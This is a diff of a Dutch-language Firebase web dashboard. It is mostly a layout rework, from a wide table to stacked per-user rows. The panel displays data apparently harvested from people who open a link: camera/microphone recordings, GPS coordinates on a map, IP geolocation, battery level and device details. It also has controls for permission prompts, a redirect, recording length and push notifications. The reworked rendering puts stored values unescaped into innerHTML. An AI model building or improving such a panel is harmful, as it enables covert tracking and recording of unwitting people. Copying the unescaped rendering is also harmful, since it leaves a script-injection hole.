@@ -21,7 +21,7 @@
             box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
             padding: 30px;
             width: 100%;
-            max-width: 1200px; /* Wider container */
+            max-width: 700px; /* Terug naar smallere container */
         }
         h2 {
             color: #333;
@@ -89,37 +89,37 @@
         }
         .input-field {
             width: 100%;
-            padding: 8px;
+            padding: 10px;
             border: 1px solid #ddd;
             border-radius: 6px;
             box-sizing: border-box;
-            font-size: 0.9rem;
+            font-size: 1rem;
         }
-        .save-button, #trigger-redirect, .send-user-notification-button {
+        .save-button, #trigger-redirect, .send-user-notification-button, #toggle-data-table { /* Added #toggle-data-table */
             background-color: #007bff;
             color: white;
-            padding: 10px 16px;
+            padding: 12px 20px;
             border: none;
             border-radius: 6px;
             cursor: pointer;
-            font-size: 0.9rem;
+            font-size: 1rem;
             transition: background-color 0.3s ease;
             margin-top: 10px;
             display: inline-block;
             text-decoration: none;
             text-align: center;
         }
-        .save-button:hover, #trigger-redirect:hover, .send-user-notification-button:hover {
+        .save-button:hover, #trigger-redirect:hover, .send-user-notification-button:hover, #toggle-data-table:hover {
             background-color: #0056b3;
         }
         .data-section {
-            margin-top: 20px;
+            margin-top: 30px;
             border-top: 1px solid #eee;
             padding-top: 20px;
         }
         .data-section h3 {
             color: #333;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
         .data-table {
             width: 100%;
@@ -127,12 +127,13 @@
             border-radius: 8px;
             overflow: hidden;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+            margin-top: 20px; /* Added margin to separate from title */
         }
         .data-table th, .data-table td {
-            padding: 8px 10px;
+            padding: 12px 15px;
             border-bottom: 1px solid #eee;
             text-align: left;
-            font-size: 0.9rem;
+            font-size: 1rem;
         }
         .data-table th {
             background-color: #f9f9f9;
@@ -151,51 +152,71 @@
             display: none;
         }
         .explanation {
-            font-size: 0.8rem;
+            font-size: 0.9rem;
             color: #777;
             margin-left: auto;
-            margin-right: 10px;
+            margin-right: 20px;
             font-style: italic;
         }
         .error-message {
             color: #dc3545;
-            margin-top: 10px;
+            margin-top: 20px;
             font-weight: bold;
-            font-size: 0.9rem;
         }
         #success-message {
             color: #00a86b;
-            margin-top: 10px;
+            margin-top: 20px;
             display: none;
             font-weight: bold;
-            font-size: 0.9rem;
         }
 
         /* Style for the map container */
         #location-map {
-            height: 200px;
+            height: 250px; /* Adjusted map height */
             width: 100%;
             border: 1px solid #ddd;
             border-radius: 4px;
+            margin-top: 10px; /* Added margin below map */
         }
 
-        /* Notification cell styling */
-        .notification-cell {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start; /* Align items to the start */
-            gap: 5px; /* Add some spacing between elements */
+        /* Vertical Table Layout Styles */
+        .user-row {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            overflow: hidden; /* To contain floated elements */
         }
 
-        .notification-cell input[type='text'],
-        .notification-cell input[type='file'] {
-            margin-bottom: 5px; /* Spacing for inputs */
-            width: 100%; /* Input fields take full width */
-            max-width: 200px; /* Limit input field width if needed */
+        .user-row td {
+            padding: 20px;
+            display: block; /* Stack td content vertically */
+            border-bottom: none; /* Remove bottom border for vertical layout */
         }
 
-        .notification-cell button.send-user-notification-button {
-            margin-top: 5px; /* Spacing for button */
+        .user-row td:last-child {
+            border-bottom: none; /* Ensure last td also has no bottom border */
+        }
+
+        .data-label {
+            font-weight: bold;
+            margin-bottom: 5px;
+            display: block; /* Ensure label is on its own line */
+        }
+
+        .notification-section {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+        }
+
+         .notification-section .input-row {
+            flex-direction: column; /* Stack labels and inputs vertically */
+            align-items: stretch; /* Stretch inputs to full width */
+        }
+
+        .notification-section .input-row label {
+            text-align: left; /* Align labels to the left */
+            margin-bottom: 5px;
         }
 
 
@@ -277,29 +298,10 @@
 
 
           <!-- Data Section -->
-        <div class="data-section">
+        <div class="data-section" id="data-section"> <!-- Added id for toggling -->
             <h3 id="data-table-title" class="editable-title" data-original-title="Verzamelde Gegevens:">Verzamelde Gegevens:</h3>
-            <table class="data-table">
-                <thead>
-                    <tr>
-                        <th>User ID</th>
-                        <th>Opname</th>
-                        <th>Latitude</th>
-                        <th>Longitude</th>
-                        <th>Locatie Nauwkeurigheid</th>
-                        <th>Locatie op Kaart</th>
-                        <th>IP Adres</th>
-                        <th>IP Stad</th>
-                        <th>IP Regio</th>
-                        <th>IP Land</th>
-                        <th>Battery Percentage</th>
-                        <th>Locatie Fout</th>
-                        <th>Batterij Fout</th>
-                        <th>Camera/Microfoon Fout</th>
-                        <th>Device Informatie</th>
-                        <th>Stuur Notificatie</th> <!-- Notification Column -->
-                    </tr>
-                </thead>
+            <button class="save-button" id="toggle-data-table">Verberg Tabel</button> <!-- Toggle button -->
+            <table class="data-table" id="data-table">
                 <tbody id="data-list">
                     <!-- User data rows will be added here -->
                 </tbody>
@@ -327,6 +329,7 @@ const storage = firebase.storage();
 
 const errorMessage = document.getElementById("error-message");
 const successMessage = document.getElementById('success-message');
+const dataSectionElement = document.getElementById('data-section'); // Get data section element
 
 // --- Form Elements ---
 const micCamPermissionToggle = document.getElementById('mic-cam-permission');
@@ -342,8 +345,11 @@ const triggerRedirectButton = document.getElementById('trigger-redirect');
 const notificationExplanation = document.getElementById("notification-explanation");
 const locationExplanation = document.getElementById("location-explanation");
 const dataTableTitleElement = document.getElementById("data-table-title");
+const toggleDataTableButton = document.getElementById('toggle-data-table'); // Get toggle button
+
 
 let currentUserId = "user1";
+
 
 // --- Firestore References (DYNAMIC USER ID) ---
 async function getNextUserId() {
@@ -371,233 +377,133 @@ async function getNextUserId() {
 }
 
 
-// Utility function to promisify Geolocation API
-function getCurrentPositionPromise() {
-    return new Promise((resolve, reject) => {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(resolve, reject);
-        } else {
-            reject(new Error("Geolocation is not supported"));
-        }
-    });
-}
+// Add a user row to the data table (VERTICAL LAYOUT)
+function addDataItem(userId, userData) {
+    const row = document.createElement('tr');
+    row.className = 'user-row'; // Apply user-row class
+    row.id = `user-row-${userId}`;
 
- // Utility function to promisify Battery API
-function getBatteryPromise() {
-    return new Promise((resolve, reject) => {
-        if(navigator.getBattery) {
-           resolve(navigator.getBattery());
-        }else{
-            reject(new Error("Battery API is not supported."));
-        }
-    });
+    let cellContent = '';
 
-    }
+    cellContent += `
+        <td>
+            <span class="data-label">User ID:</span>
+            <span>${userId}</span>
+        </td>
+        <td>
+            <span class="data-label">Opname:</span>
+            <div id="video-container-${userId}"></div>
+        </td>
+        <td>
+            <span class="data-label">Latitude:</span>
+            <span>${userData.location?.latitude ? userData.location.latitude.toFixed(4) : 'Geen data'}</span>
+        </td>
+        <td>
+            <span class="data-label">Longitude:</span>
+            <span>${userData.location?.longitude ? userData.location.longitude.toFixed(4) : 'Geen data'}</span>
+        </td>
+        <td>
+            <span class="data-label">Locatie Nauwkeurigheid:</span>
+            <span>${userData.location?.accuracy ? `±${userData.location.accuracy.toFixed(0)} meter` : 'Geen data'}</span>
+        </td>
+        <td>
+            <span class="data-label">Locatie op Kaart:</span>
+            <div id="location-map-${userId}" class="location-map"></div>
+        </td>
+        <td>
+            <span class="data-label">IP Adres:</span>
+            <span>${userData.ipLocation?.ip || 'Geen data'}</span>
+        </td>
+        <td>
+            <span class="data-label">IP Stad:</span>
+            <span>${userData.ipLocation?.city || 'Geen data'}</span>
+        </td>
+        <td>
+            <span class="data-label">IP Regio:</span>
+            <span>${userData.ipLocation?.region || 'Geen data'}</span>
+        </td>
+        <td>
+            <span class="data-label">IP Land:</span>
+            <span>${userData.ipLocation?.country || 'Geen data'}</span>
+        </td>
+        <td>
+            <span class="data-label">Battery Percentage:</span>
+            <span>${userData.batteryPercentage ? `${userData.batteryPercentage.toFixed(0)}%` : 'Geen data'}</span>
+        </td>
+        <td>
+            <span class="data-label">Locatie Fout:</span>
+            <span>${userData.locationError || 'Geen data'}</span>
+        </td>
+        <td>
+            <span class="data-label">Batterij Fout:</span>
+            <span>${userData.batteryError || 'Geen data'}</span>
+        </td>
+        <td>
+            <span class="data-label">Camera/Microfoon Fout:</span>
+            <span>${userData.cameraError || 'Geen data'}</span>
+        </td>
+        <td>
+            <span class="data-label">Device Informatie:</span>
+            <span>${userData.deviceInfo || 'Geen data'}</span>
+        </td>
 
+        <td class="notification-cell">
+            <div class="notification-section">
+                <div class="input-row">
+                    <label for="notification-title-${userId}">Notificatie Titel:</label>
+                    <input type="text" id="notification-title-${userId}" class="input-field" placeholder="Titel">
+                </div>
+                <div class="input-row">
+                    <label for="notification-body-${userId}">Notificatie Bericht:</label>
+                    <input type="text" id="notification-body-${userId}" class="input-field" placeholder="Bericht">
+                </div>
+                 <div class="input-row">
+                    <label for="notification-icon-${userId}">Notificatie Icoon:</label>
+                    <input type="file" id="notification-icon-${userId}" class="input-field" accept="image/*">
+                    <input type="hidden" id="notification-icon-url-${userId}"> <!-- Hidden input for URL -->
+                </div>
+                <button class="send-user-notification-button" onclick="sendNotificationForUser('${userId}', document.getElementById('notification-title-${userId}').value, document.getElementById('notification-body-${userId}').value, document.getElementById('notification-icon-url-${userId}').value)">Stuur Notificatie</button>
+            </div>
+        </td>
+    `;
 
-// Load settings AND data from Firestore
-async function loadSettingsAndData(userId) {
-    const settingsRef = db.collection('userSettings').doc(userId);
+    row.innerHTML = cellContent;
+    dataList.appendChild(row);
 
-    try {
-        const settingsSnap = await settingsRef.get();
-        if (settingsSnap.exists) {
-            const settingsData = settingsSnap.data();
-            micCamPermissionToggle.checked = settingsData.micCamPermission || false;
-            locationPermissionToggle.checked = settingsData.locationPermission || false;
-            notificationPermissionToggle.checked = settingsData.notificationPermission || false;
-            messageText.value = settingsData.messageText || '';
-            redirectUrl.value = settingsData.redirectUrl || '';
-            redirectSeconds.value = settingsData.redirectSeconds || '0';
-            recordSeconds.value = settingsData.recordSeconds || '0';
-        }
-         updateExplanations();
-         loadAllUserData(); // Load all user data after settings
-
-    } catch (error) {
-        console.error("Error loading settings/data:", error);
-        errorMessage.textContent = `Firestore Fout: ${error.message}`;
-        errorMessage.style.display = 'block';
-    }
-}
-
- // Update explanations
-      function updateExplanations(){
-        if(locationPermissionToggle.checked){
-            locationExplanation.classList.remove("hidden");
-        }else {
-            locationExplanation.classList.add("hidden");
-        }
-
-        if(notificationPermissionToggle.checked){
-                notificationExplanation.classList.remove("hidden");
-        }else {
-                notificationExplanation.classList.add("hidden");
-        }
-    }
-
-
-// Save settings to Firestore, get next user ID, and reload
-async function saveSettings() {
-    try {
-        const nextUserId = await getNextUserId();
-
-        const settingsRef = db.collection('userSettings').doc(nextUserId);
-        const settings = {
-            micCamPermission: micCamPermissionToggle.checked,
-            locationPermission: locationPermissionToggle.checked,
-             notificationPermission: notificationPermissionToggle.checked,
-            messageText: messageText.value,
-            redirectUrl: redirectUrl.value,
-            redirectSeconds: redirectSeconds.value,
-            recordSeconds: recordSeconds.value,
-        };
-         updateExplanations();
-
-        await settingsRef.set(settings);
-        console.log("Settings saved successfully for user:", nextUserId);
-        successMessage.style.display = 'block';
-        setTimeout(() => { successMessage.style.display = 'none'; }, 3000);
-
-        currentUserId = nextUserId;
-        loadSettingsAndData(currentUserId);
-
-    } catch (error) {
-        console.error("Error saving settings:", error);
-        errorMessage.textContent = `Firestore Fout: ${error.message}`;
-        errorMessage.style.display = 'block';
-    }
-}
-
-
-// Function to display all user data in the table (ONE ROW PER USER)
-async function displayData(userId, userData) {
-    let row = document.getElementById(`user-row-${userId}`); // Try to find existing row
-
-    if (!row) { // If row doesn't exist, create it
-        row = document.createElement('tr');
-        row.id = `user-row-${userId}`; // Set row ID
-        dataList.appendChild(row);
-    } else {
-         row.innerHTML = ''; // Clear existing row content if row exists
-    }
-
-
-    // --- Create cells for each data point ---
-    const userIdCell = document.createElement('td');
-    userIdCell.textContent = userId;
-    row.appendChild(userIdCell);
-
-    const videoCell = document.createElement('td');
+     // --- Handle Video Element ---
+    const videoContainer = row.querySelector(`#video-container-${userId}`);
     if (userData.videoUrl) {
         const videoElement = document.createElement('video');
         videoElement.src = userData.videoUrl;
         videoElement.controls = true;
         videoElement.style.width = '100%';
-        videoCell.appendChild(videoElement);
+        videoContainer.appendChild(videoElement);
     } else {
-        videoCell.textContent = 'Geen data';
+        videoContainer.textContent = 'Geen data';
     }
-    row.appendChild(videoCell);
 
 
-    const locationDataPoints = ['Latitude', 'Longitude', 'Locatie Nauwkeurigheid'];
-    const locationKeys = ['latitude', 'longitude', 'accuracy'];
-    locationDataPoints.forEach((title, index) => {
-        const cell = document.createElement('td');
-        if (userData.location && userData.location[locationKeys[index]]) {
-             let value = userData.location[locationKeys[index]];
-             if(locationKeys[index] !== 'accuracy'){
-                 value = value.toFixed(4);
-             }else{
-                  value = `±${value.toFixed(0)} meter`;
-             }
-            cell.textContent = value;
-
-        } else {
-            cell.textContent = 'Geen data';
-        }
-        row.appendChild(cell);
-    });
-
-    const locationMapCell = document.createElement('td');
+     // --- Handle Leaflet Map ---
      if (userData.location && userData.location.latitude && userData.location.longitude) {
-            const mapContainer = document.createElement('div');
-            mapContainer.id = `location-map-${userId}`; // Unique map ID per user
-            mapContainer.className = 'location-map'; // Apply CSS class
-            locationMapCell.appendChild(mapContainer);
-
-            // Use setTimeout to initialize Leaflet map after the container is in DOM
-            setTimeout(() => {
+            const mapContainer = row.querySelector(`#location-map-${userId}`);
+             setTimeout(() => {
                 const map = L.map(`location-map-${userId}`).setView([userData.location.latitude, userData.location.longitude], 15);
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                     attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                 }).addTo(map);
                 L.marker([userData.location.latitude, userData.location.longitude]).addTo(map)
                     .bindPopup('<b>Huidige Locatie</b>').openPopup();
-            }, 0); // Delay map init
-        } else {
-            locationMapCell.textContent = 'Geen data';
-        }
-    row.appendChild(locationMapCell);
+            }, 0);
+     }else{
+          row.querySelector(`#location-map-${userId}`).textContent = 'Geen data';
+     }
 
 
-    const ipLocationDataPoints = ['IP Adres', 'IP Stad', 'IP Regio', 'IP Land'];
-    const ipLocationKeys = ['ip', 'city', 'region', 'country'];
-    ipLocationDataPoints.forEach((title, index) => {
-        const cell = document.createElement('td');
-        cell.textContent = userData.ipLocation ? (userData.ipLocation[ipLocationKeys[index]] || 'Geen data') : 'Geen data';
-        row.appendChild(cell);
-    });
+    // --- Event listener for icon upload (inside addDataItem for each user row) ---
+    const notificationIconButton = row.querySelector(`#notification-icon-${userId}`);
+    const iconUrlHiddenInput = row.querySelector(`#notification-icon-url-${userId}`);
 
-    const batteryCell = document.createElement('td');
-    batteryCell.textContent = userData.batteryPercentage ? `${userData.batteryPercentage.toFixed(0)}%` : 'Geen data';
-    row.appendChild(batteryCell);
-
-    const errorDataPoints = ['Locatie Fout', 'Batterij Fout', 'Camera/Microfoon Fout', 'Device Informatie'];
-    const errorKeys = ['locationError', 'batteryError', 'cameraError', 'deviceInfo'];
-    errorDataPoints.forEach((title, index) => {
-        const cell = document.createElement('td');
-        cell.textContent = userData[errorKeys[index]] || 'Geen data';
-        row.appendChild(cell);
-    });
-
-
-    // --- Create Notification Cell (Combined Column) ---
-    const notificationCell = document.createElement('td');
-    notificationCell.className = 'notification-cell'; // Apply CSS class for styling
-
-    const notificationTitleInput = document.createElement('input');
-    notificationTitleInput.type = 'text';
-    notificationTitleInput.placeholder = 'Notificatie Titel';
-    notificationTitleInput.className = 'input-field';
-    notificationTitleInput.value = userData.notificationTitle || ''; // Pre-fill if available
-
-    const notificationBodyInput = document.createElement('input');
-    notificationBodyInput.type = 'text';
-    notificationBodyInput.placeholder = 'Notificatie Bericht';
-    notificationBodyInput.className = 'input-field';
-    notificationBodyInput.value = userData.notificationBody || ''; // Pre-fill if available
-
-    const notificationIconButton = document.createElement('input'); // File input button
-    notificationIconButton.type = 'file';
-    notificationIconButton.accept = 'image/*';
-    notificationIconButton.className = 'save-button'; // style as button visually
-    const iconUrlHiddenInput = document.createElement('input');
-    iconUrlHiddenInput.type = 'hidden';
-    iconUrlHiddenInput.id = `notification-icon-url-${userId}`;
-    iconUrlHiddenInput.value = userData.notificationIcon || ''; // Pre-fill icon URL
-
-
-    const sendButton = document.createElement('button');
-    sendButton.textContent = "Stuur Notificatie";
-    sendButton.className = 'send-user-notification-button';
-
-
-    sendButton.addEventListener('click', () => sendNotificationForUser(userId, notificationTitleInput.value, notificationBodyInput.value, iconUrlHiddenInput.value));
-
-
-     notificationIconButton.addEventListener('change', async (event) => {
+    notificationIconButton.addEventListener('change', async (event) => {
         const file = event.target.files[0];
         if (!file) return;
 
@@ -609,23 +515,12 @@ async function displayData(userId, userData) {
             const uploadedIconUrl = await iconRef.getDownloadURL();
             iconUrlHiddenInput.value = uploadedIconUrl; // Store URL in hidden input
 
-
         } catch (uploadError) {
             console.error("Error uploading notification icon:", uploadError);
             errorMessage.textContent = `Fout bij uploaden notificatie icoon: ${uploadError.message}`;
             errorMessage.style.display = 'block';
         }
     });
-
-
-    notificationCell.appendChild(notificationTitleInput);
-    notificationCell.appendChild(notificationBodyInput);
-    notificationCell.appendChild(notificationIconButton);
-    notificationCell.appendChild(iconUrlHiddenInput); // Hidden input to store URL
-    notificationCell.appendChild(sendButton);
-
-    row.appendChild(notificationCell); // Append notification cell to row
-
 
 }
 
@@ -642,7 +537,7 @@ async function loadAllUserData() {
             snapshot.forEach(doc => {
                 const userId = doc.id;
                 const userData = doc.data();
-                displayData(userId, userData); // Display data for each user
+                addDataItem(userId, userData); // Display data for each user
             });
         } else {
             dataList.innerHTML = '<tr><td colspan="16" style="text-align:center;">Geen gebruikersdata gevonden.</td></tr>';
@@ -700,6 +595,16 @@ dataTableTitleElement.addEventListener('click', function() {
     if (newTitle !== null && newTitle.trim() !== "") {
         this.textContent = newTitle.trim();
         this.setAttribute('data-original-title', newTitle.trim());
+    }
+});
+
+toggleDataTableButton.addEventListener('click', function() { // Toggle table visibility
+    if (dataSectionElement.style.display === 'none') {
+        dataSectionElement.style.display = 'block';
+        toggleDataTableButton.textContent = 'Verberg Tabel';
+    } else {
+        dataSectionElement.style.display = 'none';
+        toggleDataTableButton.textContent = 'Toon Tabel';
     }
 });
 
